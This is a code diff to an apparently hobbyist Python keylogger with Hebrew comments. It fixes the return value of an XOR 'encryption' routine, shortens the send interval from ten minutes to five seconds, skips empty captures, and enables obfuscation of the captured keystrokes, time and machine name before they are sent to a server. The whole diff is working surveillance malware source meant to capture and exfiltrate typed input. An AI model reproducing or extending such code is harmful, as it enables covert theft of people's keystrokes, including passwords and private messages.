@@ -12,7 +12,7 @@ class Encryptor:
                 else:    
                     encrypted_text += chr(ord(word) ^ key)
             # print (encrypted_text)    
-            return self.encrypted_text
+            return encrypted_text
         except:
              return encrypted_text
 
@@ -56,15 +56,18 @@ class KeyLoggerManager(KeyLoggerService):
             self.send1 = NetworkWriter()
             self.encryption = Encryptor()
             while True:
-                    #זמן ההמתנה בין כל שליחה
-                    time.sleep(600)
-                    list_to_send = self.list_to_word(self.text)
-                    #שמירת זמן עכשווי
-                    time1 = str(datetime.now())
-                    jeson = {'time':time1,'data':list_to_send,'machine':machine}
+                #זמן ההמתנה בין כל שליחה
+                time.sleep(5)
+                list_to_send = self.list_to_word(self.text)
+                #שמירת זמן עכשווי
+                time1 = str(datetime.now())
+                jeson = {'time':time1,'data':list_to_send,'machine':machine}
+                if len(jeson['data']) == 0:
+                            continue
+                else:    
                     jeson = json.dumps(jeson,ensure_ascii=False)
                     #והצפנתו jsonשמירת המידע ב
-                    # jeson =json.dumps(self.encryption.encryption_using_xor(jeson,4))
+                    jeson = json.dumps(self.encryption.encryption_using_xor(jeson,4))
                     #שליחה המידע לשרת
                     self.send1.send_data(jeson)
                     print(jeson)
